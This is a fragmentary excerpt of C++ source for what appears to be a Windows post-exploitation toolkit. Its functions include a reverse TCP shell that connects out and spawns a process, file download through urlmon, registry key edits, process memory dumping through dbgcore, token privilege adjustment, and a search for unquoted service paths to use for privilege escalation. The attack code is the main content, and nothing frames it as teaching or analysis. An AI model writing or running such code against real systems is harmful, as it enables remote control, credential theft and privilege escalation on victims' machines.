...
std::string GetErrorMessage(int code) {
	LPTSTR msg = NULL;
	FormatMessage((FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS), NULL, code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&msg, 0, NULL);
...
std::string GetFileName(HMODULE hModule) {
	...
	if (GetModuleFileName(hModule, buffer, sizeof(buffer)) == 0) {
		Output("Cannot retreive the module name");
	}
	return std::string(buffer);
}

bool IsShellAccessible(bool output) {
	bool success = false;
...
bool CopyFile(std::string file, std::string out) {
	bool success = false;
	std::ifstream stream(file.c_str(), (std::ios::in | std::ios::binary));
	if (stream.fail()) {
		Output("Cannot read \"" + file + "\"");
...
bool DownloadFile(std::string url, std::string out) {
	bool success = false;
	HMODULE hLib = LoadLibrary("urlmon.dll");
	if (hLib == NULL) {
...
bool EditRegistryKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
	bool success = false;
	HKEY nKey = NULL;
	if (RegCreateKeyEx(*hKey, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) != ERROR_SUCCESS) {
		Output("Cannot create/open the registry key");
	}
	else if (RegSetValueEx(nKey, name.c_str(), 0, REG_SZ, (LPBYTE)data.c_str(), data.length()) != ERROR_SUCCESS) {
...
bool ReverseTCP(std::string ip, int port, std::string args) {
	bool success = false;
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		...
		SOCKET hSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
		if (hSocket == INVALID_SOCKET) {
			...
			if (h == NULL) {
				...
				if (WSAConnect(hSocket, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) != 0) {
					...
					if (CreateProcess(NULL, (LPSTR)args.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo) == 0) {
...
bool RunProcess(std::string file, std::string args, PHANDLE hToken) {
	...
	if (hToken == NULL) {
		STARTUPINFOA sInfo = { 0 };
		sInfo.cb = sizeof(sInfo);
		if (CreateProcess(file.c_str(), (LPSTR)args.c_str(), NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
			success = true;
		}
	}
	else {
...
bool DumpProcessMemory(int pid) {
	...
	if (hProcess == NULL) {
		...
		HMODULE hLib = LoadLibrary("dbgcore.dll");
		if (hLib == NULL) {
			...
			if (Function == NULL) {
				...
				HANDLE hFile = CreateFile(out.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
...
void HookJob(struct hook* info) {
	info->active = true;
	HMODULE hLib = LoadLibrary(info->file.c_str());
	if (hLib == NULL) {
	...
	if (hProcess == NULL) {
		...
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
			...
			for (int i = 0; i < size - 1; i++) {
				...
				if (LookupPrivilegeValue(NULL, array[i].privilege.c_str(), &tp.Privileges[0].Luid) != 0) {
					tp.PrivilegeCount = 1;
...
std::string GetUnquotedServiceName() {
	...
	if (hManager == NULL) {
		...
		if (EnumServicesStatus(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &size, &count, 0) != 0) {
			...
			if (buffer == NULL) {
				...
				if (EnumServicesStatus(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, buffer, size, &size, &count, &resume) == 0) {
					...
					for (int i = 0; i < count; i++) {
						SC_HANDLE hService = OpenService(hManager, services->lpServiceName, SERVICE_QUERY_CONFIG);
						if (hService != NULL) {
							if (QueryServiceConfig(hService, NULL, 0, &size) == 0) {
								...
								if (config != NULL) {
									if (QueryServiceConfig(hService, config, size, &size) != 0) {
...
bool ManageService(std::string name, int task) {
	...
	if (hManager == NULL) {
		...
		SC_HANDLE hService = OpenService(hManager, name.c_str(), (SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP));
		if (hService == NULL) {
